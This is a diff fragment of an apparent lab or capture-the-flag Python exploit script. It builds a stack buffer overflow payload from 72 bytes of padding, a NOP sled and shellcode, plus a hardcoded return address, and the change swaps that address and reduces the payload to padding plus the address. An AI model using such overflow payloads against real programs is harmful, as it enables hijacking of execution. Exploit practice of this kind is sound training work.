@@ -22,10 +22,10 @@ padding = b"A"*(72 - len(nopsled) - len(shellcode))
 #print (len(padding))
 
 # 0x7fffffffe978 --> 0x7fffffffec0f
-eip = b"\xfe\xe7\xff\xff\xff\x7f"
+eip = b"\x08\xec\xff\xff\xff\x7f"
 
 print (menuoption)
-exploit = nopsled + shellcode + padding + eip
+exploit = b"A" * 72 + eip
 print (exploit)
 #print (len (exploit))
 
